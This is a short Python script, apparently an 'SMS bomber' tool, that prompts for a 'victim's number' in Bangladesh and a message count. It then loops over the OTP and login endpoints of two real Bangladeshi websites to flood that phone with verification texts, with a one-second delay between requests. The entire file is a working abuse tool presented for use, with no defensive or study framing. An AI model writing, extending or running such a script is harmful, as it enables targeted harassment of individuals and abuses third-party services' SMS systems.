import requests
import os
import time

# Logo
os.system("clear")
logo = """
██████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗
██║  ██║██████╔╝██████╔╝
██║  ██║██╔═══╝ ██╔═══╝ 
██████╔╝██║     ██║     
╚═════╝ ╚═╝     ╚═╝     
Ifshita Arohi Junior Member of BICP- SMS BOMBER
"""
print(logo)

# User Input
number = input("📱 Enter the victim's number (WITHOUT +880): ")
total_sms = int(input("✉️ Enter the number of SMS to send: "))

# API List
apis = [
    {
        "url": f"https://www.bioscopelive.com/en/login/send-otp?phone=880{number}&operator=bd-otp",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0"
        },
    },
    {
        "url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{number}",
        "method": "GET",
        "headers": {
            "Referer": "https://bikroy.com/bn/users/login",
            "User-Agent": "Mozilla/5.0"
        },
    },
]

# Start sending SMS
count = 0
print("\n📡 Sending SMS...")
for i in range(total_sms):
    for api in apis:
        try:
            if api["method"] == "GET":
                response = requests.get(api["url"], headers=api["headers"])
            elif api["method"] == "POST":
                response = requests.post(api["url"], headers=api["headers"], data=api.get("data"))
            
            if response.status_code == 200:
                count += 1
                print(f"✅ {count}/{total_sms} SMS sent successfully!")
            else:
                print(f"❌ Failed to send SMS: {response.status_code}")
        except Exception as e:
            print(f"⚠️ Error: {e}")
        time.sleep(1)  # Time delay between SMS

print("\n🎉 Task completed! All SMS have been sent.")
